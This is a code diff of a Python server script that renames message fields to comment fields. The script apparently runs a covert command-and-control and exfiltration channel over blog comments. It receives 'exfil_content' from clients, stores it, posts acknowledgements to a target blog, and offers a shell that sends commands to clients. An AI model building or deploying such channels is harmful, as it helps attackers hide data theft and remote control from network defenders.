@@ -26,7 +26,7 @@ btm_recv_config.prev_unapproved_index = 0
 mtb_send_config= SendConfig()
 mtb_send_config.sender_id = server_id
 mtb_send_config.send_time_slot = 10
-mtb_send_config.confirm_time_slot = None # The master does not need to confim if its message has been sent successfully
+mtb_send_config.confirm_time_slot = None # The master does not need to confim if its comment has been sent successfully
 
 class Client:
     id = ""
@@ -54,9 +54,9 @@ def thread_start_listener():
             f.write(to_write)
             f.close()
 
-            message_id = exfil_content.split(":")[0]
-            log_print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Received message with ID " + message_id + ". Sending acknowledgement...", 1)
-            response = submit_comment(channel.target_blog, channel.ack_channel_id, message_id)
+            comment_id = exfil_content.split(":")[0]
+            log_print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Received comment with ID " + comment_id + ". Sending acknowledgement...", 1)
+            response = submit_comment(channel.target_blog, channel.ack_channel_id, comment_id)
             log_print("## " + str(response.html_response_code) + ", " + response.html_response, 2)
 
         btm_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)            
@@ -70,10 +70,10 @@ class ServerShell(cmd.Cmd):
 
     def do_info(self, args):
         log_print("[INFO] Sending info command to clients...", 1)
-        message = Message()
-        message.message_id = generate_random_string(10)
-        message.message = message.message_id + ": Info"
-        send_data(channel, message, mtb_send_config)
+        comment = Comment()
+        comment.comment_id = generate_random_string(10)
+        comment.comment = comment.comment_id + ": Info"
+        send_data(channel, comment, mtb_send_config)
 
 ServerShell().cmdloop()
 sys.exit()
